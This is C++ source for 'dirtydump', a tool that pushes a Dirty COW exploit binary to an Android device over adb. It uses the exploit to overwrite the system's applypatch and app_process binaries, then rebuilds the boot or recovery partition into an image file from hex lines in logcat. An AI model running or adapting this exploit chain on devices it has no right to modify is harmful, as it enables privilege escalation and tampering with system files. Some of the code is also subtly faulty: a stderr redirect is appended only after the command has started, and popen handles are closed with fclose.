#include <iostream>
#include <regex>
#include <stdio.h>

using namespace std;

#define BOOT 0
#define RECOVERY 1
#define ANDROID_64 "64"
#define ANDROID_32 "32"

#ifdef __linux__
#define DIRECTORY_SEPARATOR "/"
#elif __APPLE__
#define DIRECTORY_SEPARATOR "/"
#else
#define DIRECTORY_SEPARATOR "\\"
#endif

typedef unsigned char byte;

static string appDirectory;
static string arch;
static FILE *fsout;
static bool startwrite = false;
static int ncrash = 0;
static int nBlock = 0;
static long currentSize = 0;

/* Shorter regex is possible, but I prefer like that */

/* Used to start writting binary file */
static regex rs("^.+I recowvery: (\\*\\*\\* DUMP START \\*\\*\\*)\\s+");
/* Used to match all data block, and populate <datalist> */
static regex rl("^.+I recowvery: HEXDUMP = \\[([^\\]]+)\\];\\s+");
/* Used to end writting, and exit infinit loop */
static regex rf("^.+I recowvery: (\\*\\*\\* DUMP END \\*\\*\\*)\\s+");
/* Used to intercept error from <recowvery-applypatch> */
static regex re("^.+I recowvery: (\\*\\*\\* DUMP ERROR \\*\\*\\*)\\s+");
/* ADB cmd error */
static regex radbe("^error:(.+)\\s+");

/*
 * Run command
 * Return 0 if success, else -1 if error
 */
int runcmd(string cmd) {
    char rslt[256];
    int cmdv = 0;
    FILE *fc = popen(cmd.c_str(), "r");

    /* Redirect stderr to stdout */
    cmd.append(" 2>&1");

    /* To remove the \n or \r\n at the end */
    regex rcmdline("^(.+)\\s+");
    if (fc) {
        while (fgets(rslt, sizeof rslt, fc) != NULL) {
            if (regex_match(string(rslt), rcmdline))
                cout << regex_replace(string(rslt), rcmdline, "$1") << endl;
            /* If error matched, return -1 */
            if (regex_match(rslt, radbe)) {
                cmdv = -1;
                break;
            }
        }
        cout << endl;
        fclose(fc);
    } else {
        cerr << "Error running '" << string(cmd) << "'" << endl;
        return -1;
    }
    return cmdv;
}

/*
 * Used to split string
 * s : string to split (in)
 * delim : used char for split (in)
 * elems : string array result (out)
 */
void split(const string &s, char delim, vector<string> &elems) {
    stringstream ss;
    ss.str(s);
    string item;
    while (getline(ss, item, delim)) {
        elems.push_back(item);
    }
}

/*
 * Used to split string
 * s : string to split (in)
 * delim : char delimeter (in)
 * return : vector string
 */
vector<string> split(const string &s, char delim) {
    vector<string> elems;
    split(s, delim, elems);
    return elems;
}

/* Convert hex string to byte array */
void string_to_bytearray(std::string str, unsigned char *&array, int &size) {
    int length = str.length();

    /* Make sure the input string has an even digit numbers */
    if (length % 2 == 1) {
        str = "0" + str;
        length++;
    }

    /* Allocate memory for the output array */
    array = new unsigned char[length / 2];
    size = length / 2;

    std::stringstream sstr(str);
    for (int i = 0; i < size; i++) {
        char ch1, ch2;
        sstr >> ch1 >> ch2;
        int dig1, dig2;
        if (isdigit(ch1))
            dig1 = ch1 - '0';
        else if (ch1 >= 'A' && ch1 <= 'F')
            dig1 = ch1 - 'A' + 10;
        else if (ch1 >= 'a' && ch1 <= 'f')
            dig1 = ch1 - 'a' + 10;
        if (isdigit(ch2))
            dig2 = ch2 - '0';
        else if (ch2 >= 'A' && ch2 <= 'F')
            dig2 = ch2 - 'A' + 10;
        else if (ch2 >= 'a' && ch2 <= 'f')
            dig2 = ch2 - 'a' + 10;
        array[i] = dig1 * 16 + dig2;
    }
}

/*
 * Get architecture type
 * Detect if "/system/bin/app_process64" is on device
 * If found return <ANDROID_64> else <ANDROID_32>
 */
string getArchType() {
    char arch_number[8];
    FILE *get_arch;
    string val;

    get_arch = popen(
        "adb shell 'if [ -s /system/bin/app_process64 ]; then echo 64; fi;'",
        "r");
    fgets(arch_number, sizeof(arch_number), get_arch);
    pclose(get_arch);

    if (strstr(arch_number, "64")) {
        cout << "* Android x64 version detected." << endl;
        val = string(ANDROID_64);
    } else {
        cout << "* Android x32 version detected." << endl;
        val = string(ANDROID_32);
    }
    return val;
}

/*
 * Display help
 */
void help() {
    cout << "dirtydump boot | recovery" << endl;
    cout << "Usage :" << endl;
    cout << "\tdirtydump boot     : Dump device boot partition and save it to "
            "boot.img."
         << endl;
    cout << "\tdirtydump recovery : Dump device recovery partition and save it "
            "to recovery.img."
         << endl
         << endl;
    cout << "Information :" << endl;
    cout << "\tThis app use the same exploit explained here : " << endl;
    cout << "\thttps://github.com/jcadduono/android_external_dirtycow" << endl;
    cout << "\tThe only difference is by the <applypatch>, instead of patching,"
         << endl;
    cout << "\tit read your boot / recovery partition." << endl;
    cout << "\tConvert all data to hex value, and display it." << endl;
    cout << "\tDuring the process, the app read all data through" << endl;
    cout << "\t<adb logcat -s recowvery> and do the reverse," << endl;
    cout << "\tconvert all hex value to binary, and write it to a file."
         << endl;
    cout << "\tBecause your device is like crashing, this app reboot" << endl;
    cout << "\tautomaticaly when the process is finished." << endl;
    cout << endl;
}

/*
 * Initialize process.
 * Push required files to your device and apply a chmod to them and exit.
 */
int init() {
    char cmd[128];

    cout << "***************" << endl;
    cout << "**** Init *****" << endl;
    cout << "***************" << endl << endl;

    string files[] = {"dirtycow", "recowvery-applypatch_boot",
                      "recowvery-applypatch_recovery",
                      "recowvery-app_process64", "recowvery-app_process32"};
    string cmdlist[] = {
        "adb shell chmod 0777 /data/local/tmp/dirtycow",
        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_boot",
        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_recovery",
        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process64",
        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process32"};

    /* Push files to the device */
    for (auto s : files) {
        sprintf(cmd, "adb push %s%sbin%s%s /data/local/tmp",
                appDirectory.c_str(), DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR,
                s.c_str());
        cout << string(cmd) << endl;

        if (runcmd(cmd) != 0)
            return -1;
    }

    /* Apply chmod to the pushed files */
    for (auto s : cmdlist) {
        cout << string(s) << endl;

        if (runcmd(s) != 0)
            return -1;
    }

    arch = getArchType();
    if (arch.empty())
        return -1;

    return 0;
}

/*
 * Apply exploit to applypatch (for boot or process) and app_process*
 */
int runExploit(int v) {
    cout << "**********************" << endl;
    cout << "**** Run Exploit *****" << endl;
    cout << "**********************" << endl << endl;

    string cmdlist[] = {
        "", /* For applypatch */
        ""  /* For app_process */
    };

    if (v == BOOT)
        cmdlist[0].append(
            "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
            "/data/local/tmp/recowvery-applypatch_boot");
    else if (v == RECOVERY)
        cmdlist[0].append(
            "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
            "/data/local/tmp/recowvery-applypatch_recovery");
    else
        return -1;

    if (arch == ANDROID_64)
        cmdlist[1] =
            "adb shell /data/local/tmp/dirtycow /system/bin/app_process64 "
            "/data/local/tmp/recowvery-app_process64";
    else
        cmdlist[1] =
            "adb shell /data/local/tmp/dirtycow /system/bin/app_process32 "
            "/data/local/tmp/recowvery-app_process32";

    for (auto s : cmdlist) {
        cout << s << endl;

        if (runcmd(s) != 0)
            return -1;
    }

    return 0;
}

/*
 * Reboot device from adb
 */
int rebootDevice() {
    cout << "************************" << endl;
    cout << "**** Reboot Device *****" << endl;
    cout << "************************" << endl << endl;
    return runcmd(string("adb reboot"));
}

/*
 * Function that do the stuff!
 *
 * If a line contain <*** DUMP START ***> it start to get all hex value in
 * "HEXDUMP = [a1,e2,b4,ect.]" and convert to binary before writing to output
 * file.
 *
 * All other line are :
 * <*** DUMP ERROR ***> : Error during the process or error in your device
 * <*** DUMP END ***> : Dumping is end / end of process.
 * <Other lines> : Displayed
 */
int displayLogAndConvertData(string line) {
    /*
     * If an unexpected EOF from recowvery-applypatch or if no <pipe>...
     * We can't receive a null string, so break the loop, close fsout, and exit
     * the program.
     */
    if (line.empty()) {
        cout << string("* < null > received !") << endl;
        cout << string("Try again...") << endl;
        return -1;
    }

    /*
     * <*** DUMP START ***>
     * set startwrite = true to write parsed data to fsout
     */
    if (regex_match(line, rs)) {
        startwrite = true;
        cout << "Start writing to file..." << endl;
    }

    /*
     * Parse all string received if match
     * Note :
     *   It's possible to have matched string before intercept DUMP START,
     *   If we convert now, it's a good idea to have a broken output file.
     */
    if (startwrite && regex_match(line, rl)) {
        string s = regex_replace(line, rl, "$1");
        vector<string> data = split(s, ',');
        for (int c = 0; c < (int)data.size(); c++) {
            try {
                byte *b = NULL;
                int sb;
                string_to_bytearray(data[c], b, sb);
                fwrite(b, 1, sb, fsout);
            } catch (const exception &ex) {
                cout << endl;
                cout << string("** Exception **") << endl;
                cout << string(" - When convert : ") << data[c] << endl;
                cout << string(" - Message      : ") << ex.what() << endl;
            }
        }
        nBlock++;
        currentSize = nBlock * 32;

        cout << "\r";
        cout << "Block read : " << nBlock << " (Size : " << currentSize << ")";
    } else if (!regex_match(line, rl) &&
               (!regex_match(line, rf) && !startwrite) && line.length() > 1) {
        /*
         * Display the other lines (for debuging, logging...)
         */
        cout << line;
    }

    /*
     * <*** DUMP END ***>
     * Flush and close fsout, inform the user, and break the loop.
     */
    if (startwrite && regex_match(line, rf)) {
        cout << endl << "Finish" << endl;
        startwrite = false;
        return 1;
    }

    /*
     * <*** DUMP ERROR ***>
     * An error intercepted from ADB, close fsout, set start to false.
     * "applypatch" will restart every 3 min.
     * We break the loop after 3 errors.
     */
    if (regex_match(line, re)) {
        cout << std::string("* Error received from ADB *") << std::endl;

        startwrite = false;
        if (ncrash == 3) {
            cout << std::string("* Too many tries, please check your < "
                                "recowvery-applypatch.c > and try again.")
                 << std::endl;
            return -1;
        }
        cout << std::string(
                    "* Be patient, recowvery-applypatch will restart in a few "
                    "minutes.")
             << std::endl;
        ncrash++;
    }
    return 0;
}

/*
 * Run <adb logcat -s recowvery> and send line by line to
 * <displayLogAndConvertData> function
 */
int readFromLogcat() {
    cout << "*********************************" << endl;
    cout << "**** adb logcat -s recowvery ****" << endl;
    cout << "*********************************" << endl << endl;

    char buff[1024];
    int prc = 0;
    FILE *fc = popen("adb logcat -s recowvery", "r");
    if (fc) {
        while (fgets(buff, sizeof buff, fc) != NULL) {
            prc = displayLogAndConvertData(string(buff));
            /* Error occuring */
            if (prc == -1) {
                cerr << "Error during the process !" << endl;
                break;
            }
            /* Process finished */
            if (prc == 1)
                break;
        }
        /*
         * When finish or an error received from adb, <startwrite> is set to
         * false.
         * If set to true, a NULL string has been received before receiving a
         * DUMP_END or DUMP_ERROR.
         * So, so we display an error.
         */
        if (startwrite) {
            cerr << "Error during the process !" << endl;
            prc = errno;
        }
        fclose(fc);
    } else {
        cerr << "Error running <adb logcat -s recowvery" << endl;
    }
    return prc;
}

/* main */
int main(int argc, char **argv) {
    int ret = 0;
    string filename;

    if (argc == 1) {
        help();
        return ret;
    }

    /* Fix for windows
     * If run in same directory as the exe, return only the exe name without
     * folder where it run.
     * So, if DIRECTORY_SEPARATOR not found in argv_str, appDirectory = "." for
     * linux, mac and windows
     */
    string argv_str(argv[0]);
    if (argv_str.find_last_of(DIRECTORY_SEPARATOR) != string::npos)
        appDirectory =
            argv_str.substr(0, argv_str.find_last_of(DIRECTORY_SEPARATOR));
    else
        appDirectory = string(".");

    ret = init();

    if (ret != 0)
        return ret;

    if (string(argv[1]) == "boot") {
        ret = runExploit(BOOT);
        filename = "boot.img";
    } else {
        ret = runExploit(RECOVERY);
        filename = "recovery.img";
    }

    if (ret != 0)
        return ret;
    else {
        fsout = fopen(filename.c_str(), "wb");
        if (!fsout) {
            cerr << "Can't open or create file : <" << string(filename) << ">"
                 << endl;
            rebootDevice();
            return errno;
        } else {
            ret = readFromLogcat();
            fclose(fsout);
        }
        cout << endl;
        cout << "Image file saved here :" << endl;
        cout << " " << appDirectory << string(DIRECTORY_SEPARATOR)
             << string(filename) << endl;
        cout << endl;
    }

    cout << "Rebooting your device..." << endl;
    ret = rebootDevice();

    return ret;
}
